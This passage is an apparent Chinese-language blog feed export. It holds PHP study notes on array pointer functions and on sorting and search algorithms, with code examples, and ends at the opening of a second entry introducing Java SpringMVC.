<h3 id="数组相关的函数"><a href="#数组相关的函数" class="headerlink" title="数组相关的函数"></a>数组相关的函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组相关函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 排序函数</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">3</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">sort</span>(<span class="variable">$arr</span>))  <span class="comment">// 结果为1</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$arr</span>);     <span class="comment">// 排序后，索引变为01234</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 指针函数 reset:将数组的内部指针指向第一个单元；end():将数组指针指向最后一个元素；</span></span><br><span class="line"><span class="comment">// next():     prev():指针上移   current():获取当前指针对应的元素值    key()获取当前指针对应的key</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是否指针移动</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">current</span>(<span class="variable">$arr</span>),<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">key</span>(<span class="variable">$arr</span>),<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;  <span class="comment">//若是第一个元素。则当前数组指针未移动</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">next</span>(<span class="variable">$arr</span>),<span class="title function_ invoke__">next</span>(<span class="variable">$arr</span>),<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;  <span class="comment">//15</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">prev</span>(<span class="variable">$arr</span>);<span class="comment">//1</span></span><br><span class="line"><span class="comment">// 注意事项：next，prev会移动指针，可能导致超出数组，此时再使用next、prev便不能再返回数组，只能通过end/reset</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 其他函数：count</span></span><br></pre></td></tr></table></figure>



<h2 id="编程思想"><a href="#编程思想" class="headerlink" title="编程思想"></a>编程思想</h2><h3 id="递推算法"><a href="#递推算法" class="headerlink" title="递推算法"></a>递推算法</h3><p>利用特定关系得出中间推论，直至得到结果的算法。。。分为顺推和逆推两种</p>
<p>顺推:通过最简单的条件，逐步推演结果。</p>
<p>逆推，通过结果找到规律，从而推到已知条件。</p>
<h3 id="递归算法"><a href="#递归算法" class="headerlink" title="递归算法"></a>递归算法</h3><p>把问题转化为规模缩小了的同类问题的子问题。然后递归调用函数以表达问题的解。</p>
<p><strong>简化问题，找到最优子问题。</strong></p>
<p>递归的本质是函数调用：一个函数需要开辟一块内存，递归会出现同时调用多个函数，故占用很多内存。</p>
<h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h3><p>1、比较相邻元素，若前一个比后一个大，则交换。</p>
<p>2、对每一对相邻元素进行1操作，直至最后一对。此时最后一个因为最大值。</p>
<p>3、除最后一个外，重复以上操作</p>
<p>4、重复以上操作，直至排序完成。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>);</span><br><span class="line"><span class="comment">// 计算长度</span></span><br><span class="line"><span class="variable">$len</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$len</span>-<span class="number">1</span>;<span class="variable">$i</span>++)    <span class="comment">// 第几次重复循环</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="variable">$len</span>-<span class="variable">$i</span>-<span class="number">1</span>;<span class="variable">$j</span>++)  <span class="comment">// 第几次交换</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$arr</span>[<span class="variable">$j</span>] &gt; <span class="variable">$arr</span>[<span class="variable">$j</span>+<span class="number">1</span>])</span><br><span class="line">            <span class="title function_ invoke__">swap1</span>(<span class="variable">$arr</span>[<span class="variable">$j</span>],<span class="variable">$arr</span>[<span class="variable">$j</span>+<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$arr</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 交换值</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">swap1</span>(<span class="params">&amp;<span class="variable">$a</span>,&amp;<span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$tmp</span> = <span class="variable">$a</span>;</span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$b</span>;</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$tmp</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h3><p>1、假设第一个元素为最小元素，记下下标</p>
<p>2、寻找右侧剩余元素，若有更小的，则记下更小的下标</p>
<p>3、一行对比完成后，交换第一个和最小的元素</p>
<p>4、重新开始以上操作</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line"><span class="variable">$min_index</span> = <span class="number">0</span>;  </span><br><span class="line"></span><br><span class="line"><span class="variable">$len</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="variable">$len</span>-<span class="number">1</span>; <span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$min_index</span> = <span class="variable">$i</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$min_index</span> + <span class="number">1</span>;<span class="variable">$j</span>&lt;<span class="variable">$len</span>;<span class="variable">$j</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$arr</span>[<span class="variable">$min_index</span>] &gt; <span class="variable">$arr</span>[<span class="variable">$j</span>])</span><br><span class="line">            <span class="variable">$min_index</span> = <span class="variable">$j</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$min_index</span> != <span class="variable">$i</span>)</span><br><span class="line">    	<span class="title function_ invoke__">swap1</span>(<span class="variable">$arr</span>[<span class="variable">$min_index</span>],<span class="variable">$arr</span>[<span class="variable">$i</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$arr</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 交换值</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">swap1</span>(<span class="params">&amp;<span class="variable">$a</span>,&amp;<span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$tmp</span> = <span class="variable">$a</span>;</span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$b</span>;</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$tmp</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h3><p>1、认定一个第一个元素已经排好序；</p>
<p>2、取出第二个元素作为待插入元素；</p>
<p>3、将待插入元素与已排好元素比较；</p>
<p>4、若小于已排好元素，则说明前面排序未在正确位置，应该向后移动，让新元素插入进去</p>
<p>5、重复以上操作，直到该元素插入完毕</p>
<p>6、重复操作，直至所有元素完毕</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [<span class="number">4</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$len</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">1</span>;<span class="variable">$i</span>&lt;<span class="variable">$len</span>;<span class="variable">$i</span>++)   <span class="comment">// 第几个元素为待插入元素</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$tmp</span> = <span class="variable">$arr</span>[<span class="variable">$i</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$i</span>;<span class="variable">$j</span>&gt;<span class="number">0</span>;<span class="variable">$j</span>--)  <span class="comment">// 比较几次</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$tmp</span> &lt; <span class="variable">$arr</span>[<span class="variable">$j</span>-<span class="number">1</span>])    <span class="comment">// 注意此处比较的是tmp</span></span><br><span class="line">            <span class="variable">$arr</span>[<span class="variable">$j</span>] = <span class="variable">$arr</span>[<span class="variable">$j</span>-<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$arr</span>[<span class="variable">$j</span>] != <span class="variable">$tmp</span>)</span><br><span class="line">        <span class="variable">$arr</span>[<span class="variable">$j</span>] =<span class="variable">$tmp</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$arr</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 交换值</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">swap1</span>(<span class="params">&amp;<span class="variable">$a</span>,&amp;<span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$tmp</span> = <span class="variable">$a</span>;</span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$b</span>;</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$tmp</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="快速排序法："><a href="#快速排序法：" class="headerlink" title="快速排序法："></a>快速排序法：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义数组开头及结尾</span></span><br><span class="line"><span class="variable">$start</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$end</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>)-<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义函数作为递归函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">quick_sort</span>(<span class="params"><span class="variable">$arr</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 递归出口</span></span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$len</span> &lt;= <span class="number">1</span>) <span class="keyword">return</span> <span class="variable">$arr</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 比较并分散数据</span></span><br><span class="line">    <span class="variable">$left</span> = <span class="variable">$right</span> = <span class="keyword">array</span>();  <span class="comment">// 定义空数组用于存放大的或小的</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">1</span>;<span class="variable">$i</span>&lt;<span class="variable">$len</span>;<span class="variable">$i</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$arr</span>[<span class="variable">$i</span>]&gt;<span class="variable">$arr</span>[<span class="number">0</span>]) <span class="variable">$right</span>[] = <span class="variable">$arr</span>[<span class="variable">$i</span>];   <span class="comment">// 大于存放在右边数组</span></span><br><span class="line">        <span class="keyword">else</span> <span class="variable">$left</span>[] = <span class="variable">$arr</span>[<span class="variable">$i</span>];   <span class="comment">// 小于存放在左边数组</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 递归</span></span><br><span class="line">    <span class="variable">$left</span> = <span class="title function_ invoke__">quick_sort</span>(<span class="variable">$left</span>);  <span class="comment">// 分别将右数组和左数组进一步排序</span></span><br><span class="line">    <span class="variable">$right</span> = <span class="title function_ invoke__">quick_sort</span>(<span class="variable">$right</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">array_merge</span>(<span class="variable">$left</span>,(<span class="keyword">array</span>)<span class="variable">$arr</span>[<span class="number">0</span>],<span class="variable">$right</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">quick_sort</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$res</span>);   <span class="comment">// 不能用echo</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 快排双指针</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">7</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">quick_sort</span>(<span class="params"><span class="variable">$arr</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 递归结束条件</span></span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$len</span> &lt;= <span class="number">1</span>) <span class="keyword">return</span> <span class="variable">$arr</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 定义双指针</span></span><br><span class="line">    <span class="variable">$left</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$right</span> = <span class="variable">$len</span>-<span class="number">1</span>;</span><br><span class="line">    <span class="variable">$pivot</span> = <span class="variable">$arr</span>[<span class="number">0</span>];  <span class="comment">// 确定基准</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$left</span> &lt; <span class="variable">$right</span>)   <span class="comment">// left == right时跳出循环</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$left</span> &lt; <span class="variable">$right</span> &amp;&amp; <span class="variable">$arr</span>[<span class="variable">$right</span>] &gt;= <span class="variable">$pivot</span>) <span class="variable">$right</span>--;</span><br><span class="line">		<span class="keyword">while</span>(<span class="variable">$left</span> &lt; <span class="variable">$right</span> &amp;&amp; <span class="variable">$arr</span>[<span class="variable">$left</span>] &lt;= <span class="variable">$pivot</span>) <span class="variable">$left</span>++;</span><br><span class="line">		<span class="title function_ invoke__">swap1</span>(<span class="variable">$arr</span>[<span class="variable">$left</span>],<span class="variable">$arr</span>[<span class="variable">$right</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">swap1</span>(<span class="variable">$arr</span>[<span class="variable">$left</span>],<span class="variable">$arr</span>[<span class="number">0</span>]);   <span class="comment">// 跳出循环时，left = right ，故将pivot赋值即可</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 递归点(上述操作完毕后，需要进一步排序左边和右边，故需递归)</span></span><br><span class="line">    <span class="variable">$left_arr</span> = <span class="title function_ invoke__">quick_sort</span>(<span class="title function_ invoke__">array_slice</span>(<span class="variable">$arr</span>,<span class="number">0</span>,<span class="variable">$left</span>));</span><br><span class="line">    <span class="variable">$right_arr</span> = <span class="title function_ invoke__">quick_sort</span>(<span class="title function_ invoke__">array_slice</span>(<span class="variable">$arr</span>,<span class="variable">$left</span>+<span class="number">1</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">array_merge</span>(<span class="variable">$left_arr</span>,(<span class="keyword">array</span>)<span class="variable">$arr</span>[<span class="variable">$left</span>],<span class="variable">$right_arr</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">quick_sort</span>(<span class="variable">$arr</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 交换值</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">swap1</span>(<span class="params">&amp;<span class="variable">$a</span>,&amp;<span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$tmp</span> = <span class="variable">$a</span>;</span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$b</span>;</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$tmp</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 二路合并算法</span></span><br><span class="line"><span class="variable">$arr1</span> = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">6</span>);</span><br><span class="line"><span class="variable">$arr2</span> = <span class="keyword">array</span>(<span class="number">3</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="keyword">array</span>();    <span class="comment">// 存合并后的元素</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$arr1</span>) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$arr2</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$res</span>[] = <span class="variable">$arr1</span>[<span class="number">0</span>]&gt;<span class="variable">$arr2</span>[<span class="number">0</span>] ? <span class="title function_ invoke__">array_shift</span>(<span class="variable">$arr2</span>):<span class="title function_ invoke__">array_shift</span>(<span class="variable">$arr1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$arr1</span>) &amp;&amp; !<span class="title function_ invoke__">count</span>(<span class="variable">$arr2</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$res</span>[] = <span class="title function_ invoke__">array_shift</span>(<span class="variable">$arr1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$arr2</span>) &amp;&amp; !<span class="title function_ invoke__">count</span>(<span class="variable">$arr1</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$res</span>[] = <span class="title function_ invoke__">array_shift</span>(<span class="variable">$arr2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$res</span>);</span><br></pre></td></tr></table></figure>

<p>1、将数组拆分成两个数组</p>
<p>2、重复步骤1，将数组拆分成最小单元</p>
<p>3、然后二路归并</p>
<p>4、重复步骤直至完成</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 归并排序</span></span><br><span class="line">    </span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge_sort</span>(<span class="params"><span class="variable">$arr</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 1、递归结束条件</span></span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$len</span> &lt;= <span class="number">1</span>) <span class="keyword">return</span> <span class="variable">$arr</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2、重复的操作</span></span><br><span class="line">    <span class="comment">// 2、1 拆分数组</span></span><br><span class="line">    <span class="variable">$middle</span> = <span class="variable">$len</span>&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="variable">$left</span> = <span class="title function_ invoke__">array_slice</span>(<span class="variable">$arr</span>,<span class="number">0</span>,<span class="variable">$middle</span>);</span><br><span class="line">    <span class="variable">$right</span> = <span class="title function_ invoke__">array_slice</span>(<span class="variable">$arr</span>,<span class="variable">$middle</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 4、递归点（最后写这一步，先将一层的分离和合并写完，再找递归点）</span></span><br><span class="line">    <span class="variable">$left</span> = <span class="title function_ invoke__">merge_sort</span>(<span class="variable">$left</span>);</span><br><span class="line">    <span class="variable">$right</span> = <span class="title function_ invoke__">merge_sort</span>(<span class="variable">$right</span>);</span><br><span class="line">    <span class="comment">// 2、2 二路归并</span></span><br><span class="line">    <span class="variable">$res</span> = <span class="keyword">array</span>();    <span class="comment">// 存合并后的元素</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$left</span>) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$right</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$res</span>[] = <span class="variable">$left</span>[<span class="number">0</span>]&gt;<span class="variable">$right</span>[<span class="number">0</span>] ? <span class="title function_ invoke__">array_shift</span>(<span class="variable">$right</span>):<span class="title function_ invoke__">array_shift</span>(<span class="variable">$left</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$left</span>) &amp;&amp; !<span class="title function_ invoke__">count</span>(<span class="variable">$right</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$res</span>[] = <span class="title function_ invoke__">array_shift</span>(<span class="variable">$left</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$right</span>) &amp;&amp; !<span class="title function_ invoke__">count</span>(<span class="variable">$left</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$res</span>[] = <span class="title function_ invoke__">array_shift</span>(<span class="variable">$right</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3、返回值</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">array_merge</span>(<span class="variable">$res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">merge_sort</span>(<span class="variable">$arr</span>));</span><br></pre></td></tr></table></figure>

<h3 id="查找算法"><a href="#查找算法" class="headerlink" title="查找算法"></a>查找算法</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">17</span>,<span class="number">24</span>,<span class="number">31</span>,<span class="number">32</span>);</span><br><span class="line"><span class="comment">// 顺序查找：从数组第一个元素开始挨个匹配</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find_index</span>(<span class="params"><span class="variable">$arr</span>,<span class="variable">$num</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$v</span> == <span class="variable">$num</span>) <span class="keyword">return</span> <span class="variable">$k</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// var_dump(find_index($arr,2));  // 不存在，故返回bool(false)</span></span><br><span class="line"><span class="comment">// var_dump(find_index($arr,32));  // 存在，故返回int(5)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Binary_search</span>(<span class="params"><span class="variable">$arr</span>,<span class="variable">$num</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);</span><br><span class="line">    <span class="variable">$left</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$right</span> = <span class="variable">$len</span>-<span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$left</span> &lt;= <span class="variable">$right</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$middle</span> = <span class="variable">$left</span>+(<span class="variable">$right</span>-<span class="variable">$left</span>&gt;&gt;<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$arr</span>[<span class="variable">$middle</span>] &gt; <span class="variable">$num</span>) </span><br><span class="line">			<span class="variable">$right</span> = <span class="variable">$middle</span>-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">elseif</span>(<span class="variable">$arr</span>[<span class="variable">$middle</span>] &lt; <span class="variable">$num</span>) </span><br><span class="line">			<span class="variable">$left</span> = <span class="variable">$middle</span>+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$middle</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">Binary_search</span>(<span class="variable">$arr</span>,<span class="number">6</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">Binary_search</span>(<span class="variable">$arr</span>,<span class="number">2</span>));</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端技术</category>
        <category>语言</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-SSM-SpringMVC</title>
    <url>/2024/12/21/Java-SSM-SpringMVC/</url>
    <content><![CDATA[<h1 id="一、基本介绍"><a href="#一、基本介绍" class="headerlink" title="一、基本介绍"></a>一、基本介绍</h1><h2 id="笔记说明"><a href="#笔记说明" class="headerlink" title="笔记说明"></a>笔记说明</h2><h3 id="笔记平台"><a href="#笔记平台" class="headerlink" title="笔记平台"></a>笔记平台</h3><p>（1）IDEA开发工具：2022.1.2<br>（2）JDK：Java17<strong>（Spring6要求JDK最低版本是Java17）</strong><br>（3）SpringMVC：6.0.2</p>
<p>（4）Maven：3.6+</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><strong>主要参考资料：</strong></p>
<p><a href="https://www.bilibili.com/video/BV1AP411s7D7/?spm_id_from=333.1387.search.video_card.click&vd_source=20530c92c1be8bd70e37346e3a5c037a">尚硅谷-SSM</a></p>
<p><a href="https://docs.spring.io/spring-framework/reference/web/webmvc.html">SpringMVC官方文档</a></p>
<p><strong>其他参考资料：</strong></p>
<p><a href="https://www.bilibili.com/video/BV1Ry4y1574R/?spm_id_from=333.1387.search.video_card.click">【尚硅谷】Spring<em>MVC</em>教程丨一套快速上手spring <em>mvc</em></a></p>
<p><a href="https://www.bilibili.com/video/BV1mW411M7YA/?spm_id_from=333.1387.search.video_card.click">尚硅谷Spring<em>MVC</em>实战教程完整版(spring <em>mvc</em>框架源码解析)</a></p>
<hr>
<h2 id="SpringMVC介绍"><a href="#SpringMVC介绍" class="headerlink" title="SpringMVC介绍"></a>SpringMVC介绍</h2><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241229212955.png"></p>
<p>Spring  MVC（Model-View-Controller，模型-视图-控制器）是Spring框架的一部分，它提供了一个基于MVC设计模式的Web应用程序开发框架。Spring MVC旨在简化Web层的开发，同时保持灵活性和可配置性，允许开发者根据需要选择使用框架提供的默认实现或自定义自己的组件。SpringMVC的作用主要覆盖的是<strong>表述层</strong>，例如：</p>
<blockquote>
